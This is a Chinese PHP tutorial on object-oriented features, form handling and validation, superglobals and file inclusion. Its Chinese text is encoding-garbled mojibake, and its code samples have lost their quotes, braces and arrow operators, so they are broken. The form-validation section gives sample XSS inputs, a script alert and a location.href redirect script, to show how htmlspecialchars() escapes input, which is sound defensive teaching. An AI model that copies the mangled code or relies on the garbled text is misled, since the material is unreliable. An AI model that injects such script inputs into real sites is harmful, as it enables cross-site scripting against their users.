å¯¹è±¡æ˜¯ç±»çš„å®ä¾‹ã€‚é€šè¿‡ new å…³é”®å­—å¯ä»¥åˆ›å»ºä¸€ä¸ªç±»çš„å®ä¾‹ã€‚ $person1 = new Person(Alice, 25);echo $person1-sayHello(); // è¾“å‡º: Hello, my name is Alice è®¿é—®æ§åˆ¶/å°è£…ï¼ˆencapsulationï¼‰ PHP æä¾› 3 ç§è®¿é—®æ§åˆ¶å±æ€§æˆ–æ–¹æ³•çš„ä¿®é¥°ç¬¦ï¼š ä¿®é¥°ç¬¦ ä½œç”¨ public å…¬å¼€ï¼Œç±»å†…å¤–éƒ½èƒ½è®¿é—® private ç§æœ‰ï¼Œåªæœ‰å®šä¹‰å®ƒçš„ç±»å†…éƒ¨èƒ½è®¿é—®ï¼Œåœ¨å­ç±»ä¸­ä¹Ÿæ— æ³•ç›´æ¥è®¿é—®ï¼Œä¸èƒ½é‡å®šä¹‰ protected å—ä¿æŠ¤ï¼Œç±»å†…éƒ¨å’Œå­ç±»èƒ½è®¿é—®ï¼Œç±»çš„å¤–éƒ¨æ— æ³•ç›´æ¥è®¿é—® å±æ€§çš„è®¿é—®æ§åˆ¶ ç±»å±æ€§å¿…é¡»å®šä¹‰ä¸ºå…¬æœ‰ï¼Œå—ä¿æŠ¤ï¼Œç§æœ‰ä¹‹ä¸€ã€‚å¦‚æœç”¨ var å®šä¹‰ï¼Œåˆ™è¢«è§†ä¸ºå…¬æœ‰ æ–¹æ³•çš„è®¿é—®æ§åˆ¶ ç±»ä¸­çš„æ–¹æ³•å¯ä»¥è¢«å®šä¹‰ä¸ºå…¬æœ‰ï¼Œç§æœ‰æˆ–å—ä¿æŠ¤ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¿™äº›å…³é”®å­—ï¼Œåˆ™è¯¥æ–¹æ³•é»˜è®¤ä¸ºå…¬æœ‰ ç»§æ‰¿ï¼ˆextendsï¼‰ å­ç±»ï¼ˆChild Classï¼‰ å¯ä»¥ç»§æ‰¿ çˆ¶ç±»ï¼ˆParent Classï¼‰ çš„æ–¹æ³•å’Œå±æ€§ï¼Œç”¨ extends å…³é”®å­—å®ç°ï¼ŒPHP ä¸æ”¯æŒå¤šç»§æ‰¿ class Animal public $name; public function __construct($name) $this-name = $name; public function speak() return ğŸ—£ å«å£°æœªçŸ¥; class Dog extends Animal public function speak() return ğŸ¶ æ±ªæ±ªï¼; $dog = new Dog(æ—ºè´¢);echo $dog-speak(); // ğŸ¶ æ±ªæ±ªï¼ Dog ç»§æ‰¿ Animalï¼Œä½†é‡å†™äº† speak() æ–¹æ³•ï¼Œè®©ç‹—ç‹—å¯ä»¥å‘å‡ºã€Œæ±ªæ±ªã€çš„å«å£° æ–¹æ³•é‡å†™ å…è®¸å­ç±»é‡å†™ï¼ˆè¦†ç›–ï¼‰çˆ¶ç±»çš„æ–¹æ³• å…³é”®ç‚¹ å­ç±» ç»§æ‰¿ çˆ¶ç±» å­ç±» ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•å è¦†ç›–çˆ¶ç±»çš„æ–¹æ³• æ–¹æ³•çš„ è®¿é—®æƒé™ æ”¾å®½ï¼ˆprotected æ–¹æ³•å¯ä»¥è¢« public é‡å†™ï¼‰ åŸºæœ¬ç”¨æ³• class Animal public function speak() return ğŸ¾ è¿™æ˜¯ä¸€ä¸ªåŠ¨ç‰©çš„å£°éŸ³; class Dog extends Animal public function speak() return ğŸ¶ æ±ªæ±ªï¼; $dog = new Dog();echo $dog-speak(); // ğŸ¶ æ±ªæ±ªï¼ å­ç±» Dog é‡å†™äº† speak() æ–¹æ³•ï¼Œä¸å†ç»§æ‰¿çˆ¶ç±» Animal çš„é»˜è®¤å®ç° parent:: å…³é”®å­—è°ƒç”¨çˆ¶ç±»æ–¹æ³• å¦‚æœå­ç±»éœ€è¦è°ƒç”¨çˆ¶ç±»çš„åŒåæ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨ parent::æ–¹æ³•å() class Animal public function speak() return ğŸ¾ è¿™æ˜¯ä¸€ä¸ªåŠ¨ç‰©çš„å£°éŸ³; class Dog extends Animal public function speak() return parent::speak() . ğŸ¶ ä½†ç‹—ä¼šæ±ªæ±ªå«ï¼; $dog = new Dog();echo $dog-speak(); // ğŸ¾ è¿™æ˜¯ä¸€ä¸ªåŠ¨ç‰©çš„å£°éŸ³ ğŸ¶ ä½†ç‹—ä¼šæ±ªæ±ªå«ï¼ parent::speak() è°ƒç”¨äº†çˆ¶ç±» Animal çš„ speak()ï¼Œç„¶åè¿½åŠ äº† ğŸ¶ ä½†ç‹—ä¼šæ±ªæ±ªå«ï¼ Final å…³é”®å­— ç”¨äºé˜²æ­¢ç»§æ‰¿ï¼ˆç±»ï¼‰å’Œæ–¹æ³•é‡å†™ï¼ˆæ–¹æ³•ï¼‰ï¼Œä¸èƒ½ç”¨äºå±æ€§ å¤šæ€ï¼ˆpolymorphismï¼‰ ä¸åŒçš„ç±»å¯ä»¥ç”¨ç›¸åŒçš„æ–¹æ³•åï¼Œä½†å®ç°ä¸åŒçš„åŠŸèƒ½ class Animal public function makeSound() return ğŸ¾ è¿™æ˜¯ä¸€ä¸ªåŠ¨ç‰©çš„å£°éŸ³; class Dog extends Animal public function makeSound() return ğŸ¶ æ±ªæ±ªï¼; class Cat extends Animal public function makeSound() return ğŸ± å–µå–µï¼; // åˆ›å»ºå¯¹è±¡$dog = new Dog();$cat = new Cat();echo $dog-makeSound(); // ğŸ¶ æ±ªæ±ªï¼echo $cat-makeSound(); // ğŸ± å–µå–µï¼ ä¸åŒçš„ç±»ï¼ˆDog å’Œ Catï¼‰ç»§æ‰¿äº† Animalï¼Œä½†é‡å†™äº† makeSound() æ–¹æ³•ï¼Œå®ç°ä¸åŒçš„åŠŸèƒ½ æŠ½è±¡ç±»ï¼ˆabstractï¼‰ æŠ½è±¡ç±»åªé€‚åˆä½œä¸ºã€Œæ¨¡æ¿ã€ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼ˆåˆ›å»ºå¯¹è±¡ï¼‰ï¼Œå¿…é¡»ç”±å­ç±»ç»§æ‰¿å¹¶å®ç°å…¶æ–¹æ³• abstract class Shape abstract public function area();class Circle extends Shape public $radius; public function __construct($radius) $this-radius = $radius; public function area() return pi() * pow($this-radius, 2); $c = new Circle(5);echo $c-area(); // 78.54 Shape æ˜¯æŠ½è±¡ç±»ï¼Œä¸èƒ½ç›´æ¥åˆ›å»ºå¯¹è±¡ï¼ŒCircle ç»§æ‰¿å®ƒå¹¶å®ç° area() æ–¹æ³• æ¥å£ï¼ˆinterfaceï¼‰ æ¥å£ å®šä¹‰äº†ã€Œå¿…é¡»å®ç°ã€çš„æ–¹æ³•ï¼Œç¡®ä¿ä¸åŒç±»æœ‰ç›¸åŒçš„è¡Œä¸º æ¥å£æ˜¯é€šè¿‡ interface å…³é”®å­—æ¥å®šä¹‰çš„ï¼Œæ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•éƒ½å¿…é¡»æ˜¯å…¬æœ‰ è¦å®ç°ä¸€ä¸ªæ¥å£ï¼Œä½¿ç”¨ implements æ“ä½œç¬¦ //å®šä¹‰æ¥å£interface Logger public function log($message);//å®ç°æ¥å£class FileLogger implements Logger public function log($message) echo ğŸ“ è®°å½•æ—¥å¿—åˆ°æ–‡ä»¶ï¼š . $message; $logger = new FileLogger();$logger-log(ç³»ç»Ÿé”™è¯¯); // ğŸ“ è®°å½•æ—¥å¿—åˆ°æ–‡ä»¶ï¼šç³»ç»Ÿé”™è¯¯ é™æ€æˆå‘˜ï¼ˆStaticï¼‰ é™æ€æ–¹æ³•å’Œå±æ€§å±äºç±»æœ¬èº«ï¼Œä¸éœ€è¦å®ä¾‹åŒ–å°±å¯ç›´æ¥è®¿é—® é™æ€å±æ€§ä¸èƒ½é€šè¿‡ä¸€ä¸ªç±»å·²å®ä¾‹åŒ–çš„å¯¹è±¡æ¥è®¿é—®ï¼ˆä½†é™æ€æ–¹æ³•å¯ä»¥ï¼‰ ?phpclass Math public static $pi = 3.1416; public static function square($num) return $num * $num; echo Math::$pi; // 3.1416echo Math::square(5); // 25? é™æ€æˆå‘˜ ç”¨ :: è®¿é—® é­”æœ¯æ–¹æ³• é­”æœ¯æ–¹æ³• æ˜¯ PHP é¢„å®šä¹‰çš„ç‰¹æ®Šæ–¹æ³• æ–¹æ³• ä½œç”¨ __construct() æ„é€ å‡½æ•°ï¼Œåˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ __destruct() ææ„å‡½æ•°ï¼Œé”€æ¯å¯¹è±¡æ—¶è°ƒç”¨ __get($name) è®¿é—®ä¸å­˜åœ¨çš„å±æ€§ __set($name, $value) ç»™ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼ __call($name, $arguments) è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³• __toString() å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶è°ƒç”¨ ?phpclass MyDestructableClass function __construct() print æ„é€ å‡½æ•° ; $this-name = MyDestructableClass; function __destruct() print é”€æ¯ . $this-name . ; $obj = new MyDestructableClass();? è¾“å‡ºä¸º æ„é€ å‡½æ•°é”€æ¯ MyDestructableClass PHPè¡¨å• PHPè¡¨å•å’Œç”¨æˆ·è¾“å…¥ PHP ä¸­çš„ $_GET å’Œ $_POST å˜é‡ç”¨äºæ£€ç´¢è¡¨å•ä¸­çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨æˆ·è¾“å…¥ PHP è¡¨å•å¤„ç† å½“å¤„ç† HTML è¡¨å•æ—¶ï¼ŒPHP èƒ½æŠŠæ¥è‡ª HTML é¡µé¢ä¸­çš„è¡¨å•å…ƒç´ è‡ªåŠ¨å˜æˆå¯ä¾› PHP è„šæœ¬ä½¿ç”¨ PHP è·å–ä¸‹æ‹‰èœå•çš„æ•°æ® PHP ä¸‹æ‹‰èœå•å•é€‰ ä»¥ä¸‹å®ä¾‹æˆ‘ä»¬è®¾ç½®äº†ä¸‹æ‹‰èœå•ä¸‰ä¸ªé€‰é¡¹ï¼Œè¡¨å•ä½¿ç”¨ GET æ–¹å¼è·å–æ•°æ®ï¼Œaction å±æ€§å€¼ä¸ºç©ºè¡¨ç¤ºæäº¤åˆ°å½“å‰è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ select çš„ name å±æ€§è·å–ä¸‹æ‹‰èœå•çš„å€¼ï¼š ?php$q = isset($_GET[q])? htmlspecialchars($_GET[q]) : ;if($q) if($q ==RUNOOB) echo èœé¸Ÿæ•™ç¨‹brhttp://www.runoob.com; else if($q ==GOOGLE) echo Google æœç´¢brhttp://www.google.com; else if($q ==TAOBAO) echo æ·˜å®brhttp://www.taobao.com; else ?form action= method=get select name=q option value=é€‰æ‹©ä¸€ä¸ªç«™ç‚¹:/option option value=RUNOOBRunoob/option option value=GOOGLEGoogle/option option value=TAOBAOTaobao/option /select input type=submit value=æäº¤ /form?php? [!IMPORTANT] htmlspecialchars($_GET['q']) æ˜¯ä¸€ç§é˜²æ­¢ è·¨ç«™è„šæœ¬æ”»å‡»XSS çš„å®‰å…¨æªæ–½ htmlspecialchars()å‡½æ•°ä¼šå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œå°†ç‰¹æ®Šçš„ HTML å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼Œä»¥é˜²æ­¢å®ƒä»¬è¢«è§£é‡Šä¸º HTML æˆ– JavaScript ä»£ç  å°†ä»¥ä¸‹å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼š â†’ amp; â†’ lt; â†’ gt; â†’ quot; ' â†’ #039;ï¼ˆä»…åœ¨ä½¿ç”¨ ENT_QUOTES æ—¶ï¼‰ ?php// å‡è®¾ URL ä¸ºï¼šhttp://example.com/?q=scriptalert(XSS)/script$q = $_GET[q];echo æ‚¨è¾“å…¥çš„å†…å®¹æ˜¯ï¼š$q;//è¾“å‡ºï¼šæ‚¨è¾“å…¥çš„å†…å®¹æ˜¯ï¼šscriptalert(XSS)/script ?php// å‡è®¾ URL ä¸ºï¼šhttp://example.com/?q=scriptalert(XSS)/script$q = htmlspecialchars($_GET[q]);echo æ‚¨è¾“å…¥çš„å†…å®¹æ˜¯ï¼š$q;//è¾“å‡ºï¼šæ‚¨è¾“å…¥çš„å†…å®¹æ˜¯ï¼šlt;scriptgt;alert(XSS)lt;/scriptgt; [!NOTE] phpä¸htmlåˆ‡æ¢ if (æ¡ä»¶) // æ‰§è¡Œä¸€äº› PHP ä»£ç  else ? !-- è¿™é‡Œæ˜¯ HTML ä»£ç  -- ?php PHP ä¸‹æ‹‰èœå•å¤šé€‰ å¦‚æœä¸‹æ‹‰èœå•æ˜¯å¤šé€‰çš„ï¼ˆ multiple=â€œmultipleâ€ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†è®¾ç½® select name=â€œq[]â€ ä»¥æ•°ç»„çš„æ–¹å¼è·å–ï¼Œä»¥ä¸‹ä½¿ç”¨ POST æ–¹å¼æäº¤ ?php$q = isset($_POST[q])? $_POST[q] : ;if(is_array($q)) $sites = array( RUNOOB = èœé¸Ÿæ•™ç¨‹: http://www.runoob.com, GOOGLE = Google æœç´¢: http://www.google.com, TAOBAO = æ·˜å®: http://www.taobao.com, ); foreach($q as $val) // PHP_EOL ä¸ºå¸¸é‡ï¼Œç”¨äºæ¢è¡Œ echo $sites[$val] . PHP_EOL; else ?form action= method=post select multiple=multiple name=q[] option value=é€‰æ‹©ä¸€ä¸ªç«™ç‚¹:/option option value=RUNOOBRunoob/option option value=GOOGLEGoogle/option option value=TAOBAOTaobao/option /select input type=submit value=æäº¤ /form?php? å•é€‰æŒ‰é’®è¡¨å• PHP å•é€‰æŒ‰é’®è¡¨å•ä¸­ name å±æ€§çš„å€¼æ˜¯ä¸€è‡´çš„ï¼Œvalue å€¼æ˜¯ä¸åŒçš„ ?php$q = isset($_GET[q])? htmlspecialchars($_GET[q]) : ;if($q) if($q ==RUNOOB) echo èœé¸Ÿæ•™ç¨‹brhttp://www.runoob.com; else if($q ==GOOGLE) echo Google æœç´¢brhttp://www.google.com; else if($q ==TAOBAO) echo æ·˜å®brhttp://www.taobao.com; else ?form action= method=get input type=radio name=q value=RUNOOB /Runoob input type=radio name=q value=GOOGLE /Google input type=radio name=q value=TAOBAO /Taobao input type=submit value=æäº¤/form?php? checkbox å¤é€‰æ¡† PHP checkbox å¤é€‰æ¡†å¯ä»¥é€‰æ‹©å¤šä¸ªå€¼ ?php$q = isset($_POST[q])? $_POST[q] : ;if(is_array($q)) $sites = array( RUNOOB = èœé¸Ÿæ•™ç¨‹: http://www.runoob.com, GOOGLE = Google æœç´¢: http://www.google.com, TAOBAO = æ·˜å®: http://www.taobao.com, ); foreach($q as $val) // PHP_EOL ä¸ºå¸¸é‡ï¼Œç”¨äºæ¢è¡Œ echo $sites[$val] . PHP_EOL; else ?form action= method=post input type=checkbox name=q[] value=RUNOOB Runoobbr input type=checkbox name=q[] value=GOOGLE Googlebr input type=checkbox name=q[] value=TAOBAO Taobaobr input type=submit value=æäº¤/form?php? PHP è¡¨å•éªŒè¯ $_SERVER[â€œPHP_SELFâ€] å˜é‡ æ˜¯ä¸€ä¸ªè¶…å…¨å±€å˜é‡ï¼Œç”¨äºè¿”å›å½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶è·¯å¾„ï¼ˆç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•ï¼‰ é€šå¸¸ç”¨äºï¼šè¡¨å•çš„è‡ªæäº¤ï¼ˆself-submitting formï¼‰å’ŒåŠ¨æ€ç”Ÿæˆé¡µé¢é“¾æ¥ã€‚ åŸºæœ¬ä½¿ç”¨ ?phpecho $_SERVER[PHP_SELF];? å‡è®¾è®¿é—®è·¯å¾„ï¼šURL: http://www.example.com/test/form.php è¾“å‡ºç»“æœï¼ˆ$_SERVER[PHP_SELF] çš„å€¼ä¸ºï¼‰ï¼š /test/form.php è¡¨å•è‡ªæäº¤ é€šè¿‡ $_SERVER[PHP_SELF] å®ç°è¡¨å•æäº¤åˆ°å½“å‰é¡µé¢ ?phpif ($_SERVER[REQUEST_METHOD] == POST) $name = htmlspecialchars($_POST[name]); echo ä½ å¥½, $name!;?form method=post action=?php echo htmlspecialchars($_SERVER[PHP_SELF]); ? å§“å: input type=text name=name input type=submit value=æäº¤/form htmlspecialchars($_SERVER[PHP_SELF])é¿å…XSS ä½¿ç”¨ PHP éªŒè¯è¡¨å•æ•°æ® é¦–å…ˆæˆ‘ä»¬å¯¹ç”¨æˆ·æ‰€æœ‰æäº¤çš„æ•°æ®éƒ½é€šè¿‡ PHP çš„ htmlspecialchars() å‡½æ•°å¤„ç†ã€‚ å½“æˆ‘ä»¬ä½¿ç”¨ htmlspecialchars() å‡½æ•°æ—¶ï¼Œåœ¨ç”¨æˆ·å°è¯•æäº¤ä»¥ä¸‹æ–‡æœ¬åŸŸ: scriptlocation.href(http://www.runoob.com)/script è¯¥ä»£ç å°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºå®ƒä¼šè¢«ä¿å­˜ä¸ºHTMLè½¬ä¹‰ä»£ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š lt;scriptgt;location.href(http://www.runoob.com)lt;/scriptgt; ä»¥ä¸Šä»£ç æ˜¯å®‰å…¨çš„ï¼Œå¯ä»¥æ­£å¸¸åœ¨é¡µé¢æ˜¾ç¤ºæˆ–è€…æ’å…¥é‚®ä»¶ä¸­ã€‚ å½“ç”¨æˆ·æäº¤è¡¨å•æ—¶ï¼Œæˆ‘ä»¬å°†åšä»¥ä¸‹ä¸¤ä»¶äº‹æƒ…ï¼š ä½¿ç”¨ PHP trim() å‡½æ•°å»é™¤ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­ä¸å¿…è¦çš„å­—ç¬¦ (å¦‚ï¼šç©ºæ ¼ï¼Œtabï¼Œæ¢è¡Œ)ã€‚ ä½¿ç”¨PHP stripslashes()å‡½æ•°å»é™¤ç”¨æˆ·è¾“å…¥æ•°æ®ä¸­çš„åæ–œæ  (\\) ?php// å®šä¹‰å˜é‡å¹¶é»˜è®¤è®¾ç½®ä¸ºç©ºå€¼$name = $email = $gender = $comment = $website = ; if ($_SERVER[REQUEST_METHOD] == POST) $name = test_input($_POST[name]); $email = test_input($_POST[email]); $website = test_input($_POST[website]); $comment = test_input($_POST[comment]); $gender = test_input($_POST[gender]); function test_input($data) $data = trim($data); $data = stripslashes($data); $data = htmlspecialchars($data); return $data;? PHP è¡¨å• - å¿…éœ€å­—æ®µ PHP - å¿…éœ€å­—æ®µ å­—æ®µ éªŒè¯è§„åˆ™ åå­— å¿…éœ€ã€‚ + åªèƒ½åŒ…å«å­—æ¯å’Œç©ºæ ¼ E-mail å¿…éœ€ã€‚ + å¿…éœ€åŒ…å«ä¸€ä¸ªæœ‰æ•ˆçš„ç”µå­é‚®ä»¶åœ°å€ï¼ˆåŒ…å«@â€œå’Œâ€.ï¼‰ ç½‘å€ å¯é€‰ã€‚ å¦‚æœå­˜åœ¨ï¼Œå®ƒå¿…éœ€åŒ…å«ä¸€ä¸ªæœ‰æ•ˆçš„URL å¤‡æ³¨ å¯é€‰ã€‚å¤šè¡Œå­—æ®µï¼ˆæ–‡æœ¬åŸŸï¼‰ã€‚ æ€§åˆ« å¿…éœ€ã€‚å¿…éœ€é€‰æ‹©ä¸€ä¸ªã€‚ ?php// å®šä¹‰å˜é‡å¹¶é»˜è®¤è®¾ä¸ºç©ºå€¼$nameErr= ;$name= ;if ($_SERVER[REQUEST_METHOD] == POST) if (empty($_POST[name])) $nameErr = åå­—æ˜¯å¿…éœ€çš„ã€‚; else $name = test_input($_POST[name]); ? PHP - æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ form method=post action=?php echo htmlspecialchars($_SERVER[PHP_SELF]);? åå­—: input type=text name=name span class=error* ?php echo $nameErr;?/span brbr input type=submit name=submit value=Submit /form [!IMPORTANT] span class=error* ?php echo $nameErr;?/span æ˜¯ç”¨æ¥åœ¨ HTML é¡µé¢ä¸­åŠ¨æ€æ˜¾ç¤ºè¡¨å•éªŒè¯çš„é”™è¯¯æç¤ºæ¶ˆæ¯çš„ å¦‚æœ $nameErr ä¸ºç©ºï¼Œåˆ™æ­¤éƒ¨åˆ†ä¸ä¼šæ˜¾ç¤ºå†…å®¹ã€‚ å¦‚æœ $nameErr åŒ…å«é”™è¯¯æ¶ˆæ¯ï¼Œä¼šåœ¨é¡µé¢ä¸­æ˜¾ç¤ºï¼Œä¾‹å¦‚ï¼šåå­—æ˜¯å¿…å¡«é¡¹ PHP è¡¨å• - éªŒè¯é‚®ä»¶å’ŒURL PHP - éªŒè¯åç§° ä»¥ä¸‹ä»£ç å°†é€šè¿‡ç®€å•çš„æ–¹å¼æ¥æ£€æµ‹ name å­—æ®µæ˜¯å¦åŒ…å«å­—æ¯å’Œç©ºæ ¼ï¼Œå¦‚æœ name å­—æ®µå€¼ä¸åˆæ³•ï¼Œå°†è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼š $name = test_input($_POST[name]);if (!preg_match(/^[a-zA-Z ]*$/,$name)) $nameErr = åªå…è®¸å­—æ¯å’Œç©ºæ ¼; [!IMPORTANT] preg_match è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é… int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] ) æ­£åˆ™è¡¨è¾¾å¼ preg_replace()å¯ç”¨äºåˆ é™¤æ‰€æœ‰ HTML æ ‡ç­¾ ?php$html = h1Title/h1pContent/p;$plainText = preg_replace(/[^]+/, , $html); // æ›¿æ¢æ‰€æœ‰ HTML æ ‡ç­¾echo $plainText; // è¾“å‡º TitleContent? PHP - éªŒè¯é‚®ä»¶ $email = test_input($_POST[email]);if (!preg_match(/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/,$email)) $emailErr = éæ³•é‚®ç®±æ ¼å¼; \\wåŒ¹é…ä»»æ„å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿ï¼ˆ[a-zA-Z0-9_]ï¼‰ PHP - éªŒè¯ URL ä»¥ä¸‹ä»£ç å°†æ£€æµ‹URLåœ°å€æ˜¯å¦åˆæ³• (ä»¥ä¸‹æ­£åˆ™è¡¨è¾¾å¼è¿è¡ŒURLä¸­å«æœ‰ç ´æŠ˜å·:â€œ-â€)ï¼Œ å¦‚æœ URL åœ°å€ä¸åˆæ³•ï¼Œå°†è¾“å‡ºé”™è¯¯ä¿¡æ¯ $website = test_input($_POST[website]);if (!preg_match(/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+@#\\/%?=~_|!:,.;]*[-a-z0-9+@#\\/%=~_|]/i,$website)) $websiteErr = éæ³•çš„ URL çš„åœ°å€; PHP GETå’ŒGETå’ŒGETå’ŒPOSTå˜é‡ $_GET å˜é‡ é¢„å®šä¹‰çš„ $_GET å˜é‡ç”¨äºæ”¶é›†æ¥è‡ª method=â€œgetâ€ çš„è¡¨å•ä¸­çš„å€¼ ä»å¸¦æœ‰ GET æ–¹æ³•çš„è¡¨å•å‘é€çš„ä¿¡æ¯ï¼Œå¯¹ä»»ä½•äººéƒ½æ˜¯å¯è§çš„ï¼ˆä¼šæ˜¾ç¤ºåœ¨æµè§ˆå™¨çš„åœ°å€æ ï¼‰ï¼Œå¹¶ä¸”å¯¹å‘é€ä¿¡æ¯çš„é‡ä¹Ÿæœ‰é™åˆ¶ åœ¨ HTML è¡¨å•ä¸­ä½¿ç”¨ method=â€œgetâ€ æ—¶ï¼Œæ‰€æœ‰çš„å˜é‡åå’Œå€¼éƒ½ä¼šæ˜¾ç¤ºåœ¨ URL ä¸­ï¼Œï¼Œå› æ­¤å¯ä»¥åœ¨æ”¶è—å¤¹ä¸­æ”¶è—è¯¥é¡µé¢ï¼Œä½†åœ¨å‘é€å¯†ç æˆ–å…¶ä»–æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œä¸åº”è¯¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³• http://www.runoob.com/welcome.php?fname=Runoobage=3 $_POST å˜é‡ é¢„å®šä¹‰çš„ $_POST å˜é‡ç”¨äºæ”¶é›†æ¥è‡ª method=â€œpostâ€ çš„è¡¨å•ä¸­çš„å€¼ ä»å¸¦æœ‰ POST æ–¹æ³•çš„è¡¨å•å‘é€çš„ä¿¡æ¯ï¼Œå¯¹ä»»ä½•äººéƒ½æ˜¯ä¸å¯è§çš„ï¼ˆä¸ä¼šæ˜¾ç¤ºåœ¨æµè§ˆå™¨çš„åœ°å€æ ï¼‰ï¼Œå¹¶ä¸”å¯¹å‘é€ä¿¡æ¯çš„é‡ä¹Ÿæ²¡æœ‰é™åˆ¶ æ³¨é‡Šï¼šç„¶è€Œï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒPOST æ–¹æ³•çš„å‘é€ä¿¡æ¯çš„é‡æœ€å¤§å€¼ä¸º 8 MBï¼ˆå¯é€šè¿‡è®¾ç½® php.ini æ–‡ä»¶ä¸­çš„ post_max_size è¿›è¡Œæ›´æ”¹ï¼‰ å˜é‡ä¸æ˜¾ç¤ºåœ¨ URL ä¸­ï¼Œæ‰€ä»¥æ— æ³•æŠŠé¡µé¢åŠ å…¥ä¹¦ç­¾ http://www.runoob.com/welcome.php $_REQUEST å˜é‡ é¢„å®šä¹‰çš„ $_REQUEST å˜é‡åŒ…å«äº† GETã€_GETã€Gâ€‹ETã€_POST å’Œ $_COOKIE çš„å†…å®¹ã€‚ $_REQUEST å˜é‡å¯ç”¨æ¥æ”¶é›†é€šè¿‡ GET å’Œ POST æ–¹æ³•å‘é€çš„è¡¨å•æ•°æ® PHP é«˜çº§æ•™ç¨‹ PHP åŒ…å«æ–‡ä»¶ ç”¨äºå°†ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ PHP include å’Œ require è¯­å¥ include å’Œ require è¯­å¥ç”¨äºåœ¨æ‰§è¡Œæµä¸­æ’å…¥å†™åœ¨å…¶ä»–æ–‡ä»¶ä¸­çš„æœ‰ç”¨çš„ä»£ç  include å’Œ require é™¤äº†å¤„ç†é”™è¯¯çš„æ–¹å¼ä¸åŒä¹‹å¤–ï¼Œåœ¨å…¶ä»–æ–¹é¢éƒ½æ˜¯ç›¸åŒçš„ï¼š require ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯ï¼ˆE_COMPILE_ERRORï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šåœæ­¢æ‰§è¡Œã€‚ include ç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼ˆE_WARNINGï¼‰ï¼Œåœ¨é”™è¯¯å‘ç”Ÿåè„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚ å› æ­¤ï¼Œå¦‚æœæ‚¨å¸Œæœ›ç»§ç»­æ‰§è¡Œï¼Œå¹¶å‘ç”¨æˆ·è¾“å‡ºç»“æœï¼Œå³ä½¿åŒ…å«æ–‡ä»¶å·²ä¸¢å¤±ï¼Œé‚£ä¹ˆè¯·ä½¿ç”¨ includeã€‚å¦åˆ™ï¼Œåœ¨æ¡†æ¶ã€CMS æˆ–è€…å¤æ‚çš„ PHP åº”ç”¨ç¨‹åºç¼–ç¨‹ä¸­ï¼Œè¯·å§‹ç»ˆä½¿ç”¨ require å‘æ‰§è¡Œæµå¼•ç”¨å…³é”®æ–‡ä»¶ã€‚ include filename;æˆ–è€…require filename; å®ä¾‹ 1 å‡è®¾æœ‰ä¸€ä¸ªæ ‡å‡†çš„é¡µå¤´æ–‡ä»¶ï¼Œåä¸º â€œheader.phpâ€ã€‚å¦‚éœ€åœ¨é¡µé¢ä¸­å¼•ç”¨è¿™ä¸ªé¡µå¤´æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨ include/require htmlheadmeta charset=utf-8titleèœé¸Ÿæ•™ç¨‹(runoob.com)/title/headbody?php include header.php; ?h1æ¬¢è¿æ¥åˆ°æˆ‘çš„ä¸»é¡µ!/h1pä¸€äº›æ–‡æœ¬ã€‚/p/body/html 2 å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåœ¨æ‰€æœ‰é¡µé¢ä¸­ä½¿ç”¨çš„æ ‡å‡†èœå•æ–‡ä»¶ã€‚ â€œmenu.phpâ€: echo a href=/ä¸»é¡µ/aa href=/htmlHTML æ•™ç¨‹/aa href=/phpPHP æ•™ç¨‹/a; ç½‘ç«™ä¸­çš„æ‰€æœ‰é¡µé¢å‡åº”å¼•ç”¨è¯¥èœå•æ–‡ä»¶ã€‚ä»¥ä¸‹æ˜¯å…·ä½“çš„åšæ³•ï¼š htmlheadmeta charset=utf-8titleèœé¸Ÿæ•™ç¨‹(runoob.com)/title/headbodydiv class=leftmenu?php include menu.php; ?/divh1æ¬¢è¿æ¥åˆ°æˆ‘çš„ä¸»é¡µ!/h1pä¸€äº›æ–‡æœ¬ã€‚/p/body/html 3 å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå®šä¹‰å˜é‡çš„åŒ…å«æ–‡ä»¶ï¼ˆâ€œvars.phpâ€ï¼‰ï¼š ?php$color=red;$car=BMW;? è¿™äº›å˜é‡å¯ç”¨åœ¨è°ƒç”¨æ–‡ä»¶ä¸­ï¼š htmlheadmeta 